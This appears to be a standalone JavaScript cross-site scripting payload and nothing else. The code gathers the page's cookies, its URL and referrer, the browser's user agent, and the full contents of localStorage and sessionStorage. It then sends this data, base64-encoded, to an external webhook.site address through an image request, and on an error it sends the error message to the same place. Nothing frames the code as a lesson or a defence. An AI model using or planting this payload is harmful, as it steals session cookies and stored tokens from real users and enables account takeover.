(function () {
  function send(data) {
    new Image().src = "https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de?d=" + btoa(unescape(encodeURIComponent(data)));
  }

  try {
    let data = {
      cookie: document.cookie,
      location: location.href,
      referrer: document.referrer,
      userAgent: navigator.userAgent,
      storage: {
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage)
      }
    };
    send(JSON.stringify(data));
  } catch (e) {
    send("error:" + e.message);
  }
})();
